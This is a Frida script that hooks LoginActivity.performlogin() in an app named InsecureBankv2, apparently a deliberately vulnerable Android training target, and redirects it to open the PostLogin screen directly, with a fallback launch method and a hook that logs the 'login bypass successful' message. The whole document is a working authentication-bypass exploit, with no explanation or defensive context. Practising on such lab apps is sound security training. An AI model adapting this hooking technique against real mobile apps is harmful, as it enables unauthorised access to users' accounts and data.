Java.perform(function() {
    console.log("[*] Starting Frida script to hook performlogin() and redirect to PostLogin");
    
    try {
        // Hook the performlogin method in LoginActivity
        var LoginActivity = Java.use("com.android.insecurebankv2.LoginActivity");
        
        LoginActivity.performlogin.implementation = function() {
            console.log("[+] performlogin() called - overriding behavior");
            
            try {
                // Get current activity context
                var currentActivity = this;
                
                // Create Intent to start PostLogin activity
                var Intent = Java.use("android.content.Intent");
                var PostLoginClass = Java.use("com.android.insecurebankv2.PostLogin");
                
                var intent = Intent.$new(currentActivity, PostLoginClass.class);
                
                console.log("[+] Starting PostLogin activity instead of normal login flow");
                
                // Start the PostLogin activity
                currentActivity.startActivity(intent);
                
                // Optionally finish current activity to prevent back navigation
                currentActivity.finish();
                
            } catch (e) {
                console.log("[-] Error creating intent to PostLogin: " + e.toString());
                
                // Fallback: try to start PostLogin using string class name
                try {
                    var Intent = Java.use("android.content.Intent");
                    var intent = Intent.$new();
                    intent.setClassName(Java.use("java.lang.String").$new("com.android.insecurebankv2"), 
                                      Java.use("java.lang.String").$new("com.android.insecurebankv2.PostLogin"));
                    
                    this.startActivity(intent);
                    this.finish();
                    console.log("[+] Successfully started PostLogin using fallback method");
                    
                } catch (e2) {
                    console.log("[-] Fallback method also failed: " + e2.toString());
                }
            }
        };
        
        console.log("[+] Successfully hooked LoginActivity.performlogin()");
        
    } catch (e) {
        console.log("[-] Failed to hook LoginActivity.performlogin(): " + e.toString());
    }
    
    // Additional hook to log when PostLogin activity is created
    try {
        var PostLogin = Java.use("com.android.insecurebankv2.PostLogin");
        
        PostLogin.onCreate.implementation = function(bundle) {
            console.log("[+] PostLogin.onCreate() called - login bypass successful!");
            this.onCreate(bundle);
        };
        
        console.log("[+] Successfully hooked PostLogin.onCreate() for logging");
        
    } catch (e) {
        console.log("[-] Failed to hook PostLogin.onCreate(): " + e.toString());
    }
});